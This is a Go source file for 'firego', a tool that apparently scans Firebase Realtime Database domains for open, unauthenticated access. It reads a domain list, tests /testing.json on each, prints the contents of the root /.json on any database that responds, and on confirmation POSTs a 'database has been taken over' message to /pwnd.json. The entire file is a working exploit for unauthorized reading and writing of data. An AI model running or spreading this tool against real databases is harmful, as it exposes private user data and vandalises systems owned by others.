package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
)

type ExploitData struct {
	Message string `json:"message"`
	Name    string `json:"name"`
	GitHub  string `json:"GitHub"`
	Email   string `json:"email"`
}

func WarnaCampuran(domain string, statusCode int, KayanyaRentan bool) {
	domainColor := "\033[1;36m"
	statusColor := "\033[1;33m"
	vulnColor := "\033[1;32m"
	notVulnColor := "\033[1;34m"

	fmt.Printf("[+] %s[%s]%s [%s%d%s]\n", domainColor, domain, "\033[0m", statusColor, statusCode, "\033[0m")
	if KayanyaRentan {
		fmt.Printf("\t[%s/testing.json] -> %sseems vulnerable\033[0m\n", domain, vulnColor)
	} else {
		fmt.Printf("\t[%s/testing.json] -> %sseems not vulnerable\033[0m\n", domain, notVulnColor)
	}
}

func main() {
	printBanner()

	if len(os.Args) < 3 {
		fmt.Println("Usage: firego -u firebase-domain -l file-with-domain-list")
		return
	}

	var domains []string

	if os.Args[1] == "-l" {
		file, err := os.ReadFile(os.Args[2])
		if err != nil {
			fmt.Println("Error reading domain list:", err)
			return
		}
		domains = strings.Split(string(file), "\n")
	} else {
		domains = append(domains, os.Args[2])
	}

	exploitData := ExploitData{
		Message: "The database has been taken over.",
		Name:    "Rhyru9",
		GitHub:  "https://github.com/rhyru9/",
		Email:   "rhyru9@wearehackerone.com",
	}

	for _, domain := range domains {
		if domain == "" {
			continue
		}

		statusCode, KayanyaRentan := cek123(domain)
		WarnaCampuran(domain, statusCode, KayanyaRentan)

		if KayanyaRentan {
			snippet := getFormattedSnippet(domain)
			fmt.Println(snippet)

			fmt.Printf("\n[?] %s is vulnerable. Do you want to take over? (y/n): ", domain)
			var choice string
			fmt.Scanln(&choice)
			choice = strings.ToLower(strings.TrimSpace(choice))

			if choice == "y" || choice == "yes" {
				exploit(domain, exploitData)
			} else {
				fmt.Println("\tSkipping takeover for", domain)
			}
		}
	}
}

func cek123(domain string) (int, bool) {
	url := fmt.Sprintf("https://%s/testing.json", strings.TrimPrefix(strings.TrimPrefix(domain, "https://"), "http://"))

	resp, err := http.Get(url)
	if err != nil {
		fmt.Printf("Error checking %s: %v\n", domain, err)
		return 0, false
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		body, _ := io.ReadAll(resp.Body)
		if string(body) == "null" {
			return resp.StatusCode, true
		}
	}
	return resp.StatusCode, false
}

func getFormattedSnippet(domain string) string {
	url := fmt.Sprintf("https://%s/.json", strings.TrimPrefix(strings.TrimPrefix(domain, "https://"), "http://"))

	resp, err := http.Get(url)
	if err != nil {
		return fmt.Sprintf("\t\033[1;31mError fetching JSON: %v\033[0m", err)
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)

	var prettyJSON bytes.Buffer
	err = json.Indent(&prettyJSON, body, "", "    ")
	if err != nil {
		return fmt.Sprintf("\t\033[1;31mError formatting JSON: %v\033[0m", err)
	}

	snippetLines := strings.Split(prettyJSON.String(), "\n")
	formattedSnippet := "|\n|  [+] snippet:\n|  {\n"
	for _, line := range snippetLines {
		formattedSnippet += "|    " + line + "\n"
	}
	formattedSnippet += "|  }\n|"

	return formattedSnippet
}

func exploit(domain string, data ExploitData) {
	url := fmt.Sprintf("https://%s/pwnd.json", strings.TrimPrefix(strings.TrimPrefix(domain, "https://"), "http://"))

	jsonData, err := json.Marshal(data)
	if err != nil {
		fmt.Printf("Error marshalling JSON for %s: %v\n", domain, err)
		return
	}

	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		fmt.Printf("Error exploiting %s: %v\n", domain, err)
		return
	}
	defer resp.Body.Close()

	var finalStatus string
	if resp.StatusCode == 200 {
		finalStatus = "success"
	} else {
		finalStatus = "failed"
	}

	fmt.Printf("\t[%s/pwnd.json] [taking over] -> %s\n", domain, finalStatus)
}

func printBanner() {
	banner := "\033[1;32m" +
		"\033[3m" +
		"GitHub: https://github.com/rhyru9\n" +
		"\033[0m"

	fmt.Println(banner)
}
